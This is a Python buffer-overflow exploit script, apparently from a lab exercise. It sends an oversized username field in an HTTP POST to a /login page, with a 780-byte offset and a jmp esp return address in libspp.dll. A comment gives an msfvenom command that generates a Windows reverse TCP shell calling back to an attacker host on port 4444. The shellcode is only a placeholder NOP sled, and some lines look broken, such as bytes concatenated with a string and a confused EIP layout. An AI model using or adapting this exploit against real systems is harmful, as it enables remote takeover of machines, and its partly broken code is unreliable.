import sys, socket # Imports.

OFFSET = 780 # From the MSF pattern, this is the offset.

# msfvenom -p windows/shell_reverse_tcp LHOST=AttackerIP LPORT=4444 EXITFUNC=thread -f python -v shellcode -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
# NetCat is good for quick and fast shells.
shellcode =  b"\x90"*16
shellcode += ""

buf = b"A"*OFFSET # 780 A's.
buf += b"\x83\x0c\x09\x10" # jmp esp -> libspp.dll, even better this isn't a OS dll :3
buf += b"C"*4 # eip overwrite.
buf += shellcode # Add shellcode to the buffer.

# Body of the site to fill.
body = b"username=" + buf + b"&password=A"

req = b"POST /login HTTP/1.1\r\n"
req += b"Host: 192.168.102.129\r\n"
req += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += b"Accept-Language: en-US,en;q=0.5\r\n"
req += b"Referer: http://192.168.102.129/login\r\n"
req += b"Connection: close\r\n"
req += b"Content-Type: application/x-www-form-urlencoded\r\n"
req += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
req += b"\r\n"
req += body

print('[+] Sending payload...')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create the socket.
s.connect((sys.argv[1], 80)) # Port 80 by default.
s.send(req) # Send the payload.
s.close()
print('[+] Payload sent.')
